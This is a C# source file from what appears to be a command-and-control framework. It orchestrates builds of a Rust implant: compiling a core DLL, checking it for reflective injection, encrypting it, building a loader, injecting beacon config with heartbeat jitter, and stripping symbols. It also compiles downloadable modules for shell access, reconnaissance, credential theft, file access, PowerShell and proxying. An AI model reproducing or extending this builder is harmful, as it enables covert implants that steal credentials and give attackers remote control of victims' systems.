using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Services;

/// <summary>
/// Orchestrates asynchronous Rust builds (core DLL → encrypt → loader → config injection).
/// Stage implementations live in <see cref="BuilderBuildService"/> (partial class, BuilderBuildStages.cs).
/// </summary>
public partial class BuilderBuildService
{
    /// <summary>
    /// Resolve the build output root. Honors <c>LIBRA_BUILDS_DIR</c> (kept in
    /// sync with <see cref="Controllers.AgentCommsController"/>, which serves
    /// modules from the same directory); falls back to the dev layout relative
    /// to the app base directory.
    /// </summary>
    private static string ResolveOutputBase()
    {
        var env = Environment.GetEnvironmentVariable("LIBRA_BUILDS_DIR");
        if (!string.IsNullOrWhiteSpace(env))
            return Path.GetFullPath(env);
        return Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    }

    public static readonly string OutputBase = ResolveOutputBase();
    public static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
    public static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
    public static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");

    /// <summary>Prebuilt artifacts (core.bin + core.key) per platform — subsequent
    /// builds of the same platform skip compilation entirely.</summary>
    public static readonly string ArtifactsDir = Path.Combine(OutputBase, "artifacts");

    /// <summary>Shared cargo target dir — incremental compile cache across builds.</summary>
    public static readonly string SharedTargetDir = Path.Combine(OutputBase, "target-shared");

    /// <summary>
    /// Resolve the agent-rs workspace root. Honors <c>LIBRA_AGENT_RS_DIR</c>
    /// (e.g. a mounted source tree in container deployments); falls back to
    /// the dev layout relative to the app base directory.
    /// </summary>
    private static string ResolveRustAgentDir()
    {
        var env = Environment.GetEnvironmentVariable("LIBRA_AGENT_RS_DIR");
        if (!string.IsNullOrWhiteSpace(env))
            return Path.GetFullPath(env);
        return Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
    }

    private static readonly string RustAgentDir = ResolveRustAgentDir();

    /// <summary>Platform-scoped cloud module directory (one per target platform).</summary>
    public static string ModulesDirFor(string platform) => Path.Combine(OutputBase, "modules", platform);

    public static readonly Dictionary<string, string> PlatformOs = new()
    {
        ["x64"] = "windows",
        ["x86"] = "windows",
        ["linux-x64"] = "linux",
    };

    /// <summary>
    /// Enabled modules for this request. Empty request = all modules enabled.
    /// Names are matched tolerantly: the canonical module name, the cargo lib
    /// target name (e.g. shell_module) or a "_module"-suffixed variant all map
    /// to the same module — legacy deployments used both forms on disk and the
    /// frontend inventory may therefore carry either.
    /// </summary>
    internal static List<string> EnabledModuleList(BuildContext ctx)
    {
        var requested = ctx.Req.EnabledModules;
        if (requested == null || requested.Count == 0)
            return CloudModules.Select(m => m.Module).ToList();

        var canonical = requested
            .Select(name =>
            {
                var normalized = name?.Trim();
                if (string.IsNullOrEmpty(normalized)) return null;
                if (normalized.EndsWith("_module", StringComparison.Ordinal))
                    normalized = normalized[..^"_module".Length];
                // Exact module name match or lib target name match.
                foreach (var (module, lib) in CloudModules)
                {
                    if (module == normalized || lib == normalized)
                        return module;
                }
                return null;
            })
            .Where(m => m != null)
            .Distinct()
            .Cast<string>()
            .ToList();

        return canonical.Count > 0
            ? canonical
            : CloudModules.Select(m => m.Module).ToList();
    }

    /// <summary>
    /// </summary>
    public static (ulong heartbeatMs, double jitter) ResolveConnectionTiming(BuildConfigRequest req)
    {
        var heartbeatMs = req.HeartbeatIntervalMs ?? 3000ul;
        heartbeatMs = Math.Clamp(heartbeatMs, 500ul, 60_000ul);
        var jitter = req.JitterPercent ?? 0.2;
        jitter = Math.Clamp(jitter, 0.0, 0.9);
        return (heartbeatMs, jitter);
    }

    public static string ResolvePath(string? value, string fallback)
    {
        return string.IsNullOrWhiteSpace(value) ? fallback : value.Trim();
    }

    /// <summary>
    /// </summary>
    private static bool ModulesUpToDate(BuildContext ctx)
    {
        if (!Directory.Exists(ctx.ModulesDir))
            return false;
        var enabled = EnabledModuleList(ctx);
        var enabledSet = new HashSet<string>(enabled);

        var sharedDeps = new[] { "libra-psinline", "libra-syscalls", "libra-common", "libra-platform", "libra-modules" };
        var newestSharedDep = sharedDeps
            .Select(d => NewestSource(Path.Combine(RustAgentDir, d)))
            .DefaultIfEmpty(DateTime.MinValue)
            .Max();

        foreach (var (moduleName, _) in CloudModules)
        {
            if (!enabledSet.Contains(moduleName))
                continue;
            var artifact = Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}");
            if (!System.IO.File.Exists(artifact))
                return false;
            var artifactTime = System.IO.File.GetLastWriteTimeUtc(artifact);

            var srcDir = Path.Combine(RustAgentDir, "modules", moduleName);
            var newestSrc = NewestSource(srcDir);
            if (newestSrc > artifactTime)
                return false;
            if (newestSharedDep > artifactTime)
                return false;
        }
        return true;
    }

    private static DateTime NewestSource(string dir)
    {
        if (!Directory.Exists(dir))
            return DateTime.MinValue;
        var files = Directory.GetFiles(dir, "*.rs", SearchOption.AllDirectories)
            .Select(System.IO.File.GetLastWriteTimeUtc);
        var toml = Path.Combine(dir, "Cargo.toml");
        if (System.IO.File.Exists(toml))
            files = files.Append(System.IO.File.GetLastWriteTimeUtc(toml));
        return files.DefaultIfEmpty(DateTime.MinValue).Max();
    }

    // Module name -> cdylib lib target name (as produced by cargo).
    // The deployed file is named {moduleName}.{ext} and is fetched by the
    // agent via /api/beacon/module/{moduleName}.
    public static readonly (string Module, string Lib)[] CloudModules =
    [
        ("shell", "shell_module"),
        ("recon", "recon_module"),
        ("creds", "creds_module"),
        ("files", "files_module"),
        ("powershell", "powershell_module"),
        ("proxy", "proxy_module"),
        ("script", "script_module"),
    ];

    /// <summary>Map a deployed artifact stem (module or cargo lib target name,
    /// possibly legacy) to the canonical module name used by the agent.</summary>
    public static string CanonicalModuleName(string fileStem)
    {
        foreach (var (module, lib) in CloudModules)
            if (fileStem == module || fileStem == lib)
                return module;
        return fileStem;
    }

    /// <summary>
    /// Resolve the actual Rust target triple for a requested platform based on
    /// the operating system the server itself is running on:
    ///   Windows host → native MSVC for Win targets.
    ///   Linux host   → native GNU for Linux targets.
    /// All cross-combinations use the gnu ABI and the zig toolchain (cargo
    /// zigbuild drives zig as CC/linker, which bundles glibc/msvc support).
    /// Note: musl cannot be used here because the core payload is a cdylib.
    /// </summary>
    public static string ResolveTriple(string platform, bool hostWindows)
    {
        return PlatformOs[platform] switch
        {
            "windows" when hostWindows => platform == "x86" ? "i686-pc-windows-msvc" : "x86_64-pc-windows-msvc",
            "windows" => platform == "x86" ? "i686-pc-windows-gnu" : "x86_64-pc-windows-gnu",
            "linux" => "x86_64-unknown-linux-gnu",
            _ => throw new InvalidOperationException($"no triple for platform '{platform}'"),
        };
    }

    public static readonly ConcurrentDictionary<string, BuildJob> ActiveJobs = new();
    public static readonly object BuildLock = new();

    private readonly BeaconSettings _beaconSettings;
    private readonly ServerKeyService _serverKeys;

    public BuilderBuildService(IOptions<BeaconSettings> beaconSettings, ServerKeyService serverKeys)
    {
        _beaconSettings = beaconSettings.Value;
        _serverKeys = serverKeys;
    }

    // ── Build (async) ──────────────────────────────────────────────────

    /// <summary>
    /// </summary>
    public async Task<bool> BuildModulesOnlyAsync(string platform, List<string>? enabledModules, BuildJob job)
    {
        var req = new BuildConfigRequest
        {
            Platform = platform,
            EnabledModules = enabledModules,
            StripSymbols = true,
        };
        var ctx = new BuildContext
        {
            BuildId = "modules-only",
            Req = req,
            TempDir = Path.Combine(OutputBase, "modules-only-tmp"),
            TargetDir = SharedTargetDir,
            FinalDir = Path.Combine(OutputBase, "modules-only-tmp"),
            ForceRebuild = true,
        };
        try
        {
            var os = PlatformOs[platform];
            var hostWindows = OperatingSystem.IsWindows();
            ctx.TargetTriple = ResolveTriple(platform, hostWindows);
            ctx.TargetOs = os;
            ctx.IsCross = !(os == "windows" && hostWindows) && !(os == "linux" && !hostWindows);
            var targetArg = $"--target {ctx.TargetTriple}";
            ctx.IsWindows = os == "windows";
            ctx.IsMacos = os == "macos";
            ctx.ReleaseDir = Path.Combine(ctx.TargetDir, ctx.TargetTriple, "release");
            ctx.ModuleExt = ctx.IsWindows ? "dll" : ctx.IsMacos ? "dylib" : "so";
            ctx.ModulesDir = ModulesDirFor(platform);
            ctx.EnvVars["RUSTFLAGS"] = "-C strip=symbols";

            var result = await Stage1_6_BuildModuleAsync(ctx, targetArg, job);
            if (!result.Compiled)
            {
                job.Fail($"cloud module build failed — modules not deployed: {string.Join(", ", result.Missing)}");
                return false;
            }
            return true;
        }
        catch (Exception ex)
        {
            job.Fail($"module build failed: {ex.Message}");
            return false;
        }
    }

    public async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job, bool forceRebuild = false)
    {
        var ctx = new BuildContext
        {
            BuildId = buildId,
            Req = req,
            TempDir = Path.Combine(OutputBase, buildId),
            ForceRebuild = forceRebuild,
        };
        // All builds share one cargo target dir so incremental compilation
        // caches carry across builds (deps are only rebuilt when source changes).
        ctx.TargetDir = SharedTargetDir;
        ctx.FinalDir = ctx.TempDir;

        try
        {
            lock (BuildLock)
            {
                if (Directory.Exists(ctx.TempDir)) Directory.Delete(ctx.TempDir, true);
                Directory.CreateDirectory(ctx.TempDir);
            }

            // Determine target triple + OS (host-aware)
            var os = PlatformOs[req.Platform]; // Build() already validated the key
            var hostWindows = OperatingSystem.IsWindows();
            ctx.TargetTriple = ResolveTriple(req.Platform, hostWindows);
            ctx.TargetOs = os;
            ctx.IsCross = !(os == "windows" && hostWindows) && !(os == "linux" && !hostWindows);
            var targetArg = $"--target {ctx.TargetTriple}";

            // Desktop mode: add --features desktop
            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";

            // Set RUSTFLAGS for strip if requested
            if (req.StripSymbols)
            {
                ctx.EnvVars["RUSTFLAGS"] = "-C strip=symbols";
                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
            }

            ctx.IsWindows = os == "windows";
            ctx.IsMacos = os == "macos";
            ctx.ReleaseDir = Path.Combine(ctx.TargetDir, ctx.TargetTriple, "release");
            ctx.ModuleExt = ctx.IsWindows ? "dll" : ctx.IsMacos ? "dylib" : "so";
            ctx.ModulesDir = ModulesDirFor(req.Platform);

            // ── Prebuilt artifacts? Skip compilation entirely. ──
            var artifactCore = Path.Combine(ArtifactsDir, req.Platform, "core.bin");
            var artifactKey = Path.Combine(ArtifactsDir, req.Platform, "core.key");
            var modulesComplete = ModulesUpToDate(ctx);

            if (!forceRebuild && System.IO.File.Exists(artifactCore) && System.IO.File.Exists(artifactKey))
            {
                ctx.SkipCompile = true;
                System.IO.File.Copy(artifactCore, Path.Combine(ctx.TempDir, "core.bin"), true);
                System.IO.File.Copy(artifactKey, Path.Combine(ctx.TempDir, "core.key"), true);
                job.Log($"Prebuilt artifacts hit for {req.Platform} — skipping core compilation");
            }
            else if (forceRebuild)
            {
                job.Log($"Force rebuild requested for {req.Platform} — compiling from source");
            }
            else
            {
                job.Log($"No cached artifacts for {req.Platform} — compiling from source");
            }

            // ── Cross-compilation toolchain ──
            // Native builds need nothing extra. Cross builds require the zig
            // toolchain (cargo-zigbuild + zig on PATH); rustup must know the
            // target's std (added below, best-effort).
            if (ctx.IsCross && !ctx.SkipCompile)
            {
                job.Log($"Cross-compiling {req.Platform} ({ctx.TargetTriple}) from {(hostWindows ? "Windows" : "Linux")} host");

                var zigbuild = await RunProcessAsync("cargo", "zigbuild --help", job);
                var zig = await RunProcessAsync("zig", "version", job);
                if (zigbuild.ExitCode != 0 || zig.ExitCode != 0)
                {
                    job.Fail(
                        "Cross-compilation requires the zig toolchain.\n" +
                        "Install zig (https://ziglang.org/download) and cargo-zigbuild:\n" +
                        "  cargo install cargo-zigbuild\n" +
                        "and ensure both are on PATH.");
                    UpdateHistory(job);
                    return;
                }
                job.Log($"zig {zig.Stdout.Trim()} | cargo-zigbuild ready");
            }
            else if (!ctx.SkipCompile)
            {
                job.Log($"Native build for {req.Platform} ({ctx.TargetTriple})");
            }

            // Best-effort: make sure the rust target std is installed.
            if (!ctx.SkipCompile)
            {
                var targetAdd = await RunProcessAsync("rustup", $"target add {ctx.TargetTriple}", job);
                if (targetAdd.ExitCode != 0)
                    job.Log("[WARN] rustup target add failed — build may fail if the target is missing");
            }

            var buildSteps = new List<Func<Task>>();
            ModuleBuildResult? moduleResult = null;
            if (!ctx.SkipCompile)
            {
                buildSteps.Add(() => Stage1_BuildCoreAsync(ctx, targetArg, job));
                buildSteps.Add(() => Stage1_5_ValidateSrdiAsync(ctx, job));
            }
            if (!modulesComplete)
                buildSteps.Add(() =>
                {
                    return Stage1_6_BuildModuleAsync(ctx, targetArg, job).ContinueWith(t =>
                    {
                        if (t.IsCompletedSuccessfully)
                        {
                            moduleResult = t.Result;
                            if (!moduleResult.Compiled)
                                job.Log($"[ERROR] module build failed — agent built without cloud modules: {string.Join(", ", moduleResult.Missing)}");
                        }
                    });
                });
            else
                job.Log($"Cloud modules already deployed for {req.Platform} — skipping module build");
            buildSteps.Add(() => Stage2_EncryptCoreAsync(ctx, job));
            buildSteps.Add(() => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job));
            buildSteps.Add(() => Stage4_InjectConfigAsync(ctx, job));

            foreach (var step in buildSteps)
            {
                await step();
                if (job.IsCompleted) break; // success or failure — finalize history below
            }

            if (moduleResult is { Compiled: false })
                job.Record.Error ??= $"cloud modules missing: {string.Join(", ", moduleResult.Missing)}";

            UpdateHistory(job);

            // Cache the compiled core artifacts for future builds of this platform.
            if (job.IsCompleted && job.Record.Status == "completed" && !ctx.SkipCompile)
            {
                var artDir = Path.Combine(ArtifactsDir, req.Platform);
                Directory.CreateDirectory(artDir);
                try
                {
                    System.IO.File.Copy(Path.Combine(ctx.TempDir, "core.bin"), Path.Combine(artDir, "core.bin"), true);
                    System.IO.File.Copy(Path.Combine(ctx.TempDir, "core.key"), Path.Combine(artDir, "core.key"), true);
                    job.Log($"Artifacts cached for {req.Platform} — next build will skip compilation");
                }
                catch (Exception ex)
                {
                    job.Log($"[WARN] artifact caching failed: {ex.Message}");
                }
            }
        }
        catch (Exception ex)
        {
            job.Fail($"Build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                ActiveJobs.TryRemove(buildId, out _);
            });
        }
    }

    /// <summary>
    /// Build the cargo invocation for a build step. Cross-compilations invoke
    /// the cargo-zigbuild binary directly with its explicit `zigbuild`
    /// subcommand (cargo plugin forwarding is unreliable across cargo/rustup
    /// versions); native builds use plain `cargo build`.
    /// </summary>
    internal static string CargoBuildCommand(BuildContext ctx, string targetArg, string extraArgs)
    {
        var verb = ctx.IsCross ? "zigbuild" : "build";
        return $" {verb} --release {targetArg} {extraArgs} --target-dir \"{ctx.TargetDir}\"";
    }

    /// <summary>Executable that drives a cargo build step (cross vs native).</summary>
    internal static string CargoExe(BuildContext ctx) => ctx.IsCross ? "cargo-zigbuild" : "cargo";

    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
    {
        var psi = new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (workingDir != null) psi.WorkingDirectory = workingDir;
        if (envVars != null)
        {
            foreach (var (key, value) in envVars)
                psi.Environment[key] = value;
        }

        using var proc = new Process { StartInfo = psi };
        var stdoutTcs = new TaskCompletionSource<string>();
        var stderrTcs = new TaskCompletionSource<string>();
        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        proc.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
            else stdoutTcs.TrySetResult(stdout.ToString());
        };
        proc.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
            else stderrTcs.TrySetResult(stderr.ToString());
        };

        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        await proc.WaitForExitAsync();
        var stdoutStr = await stdoutTcs.Task;
        var stderrStr = await stderrTcs.Task;

        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
    }

    public static void UpdateHistory(BuildJob job)
    {
        var history = LoadHistory();
        var idx = history.FindIndex(r => r.Id == job.Record.Id);
        if (idx >= 0)
            history[idx] = job.Record;
        else
            history.Insert(0, job.Record);
        SaveHistory(history);
    }

    public static List<BuildRecord> LoadHistory()
    {
        try
        {
            if (System.IO.File.Exists(HistoryFile))
            {
                var json = System.IO.File.ReadAllText(HistoryFile);
                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
            }
        }
        catch { }
        return new List<BuildRecord>();
    }

    public static void SaveHistory(List<BuildRecord> records)
    {
        try
        {
            Directory.CreateDirectory(OutputBase);
            var json = JsonSerializer.Serialize(records);
            System.IO.File.WriteAllText(HistoryFile, json);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[WARN] Failed to save build history: {ex.Message}");
        }
    }
}
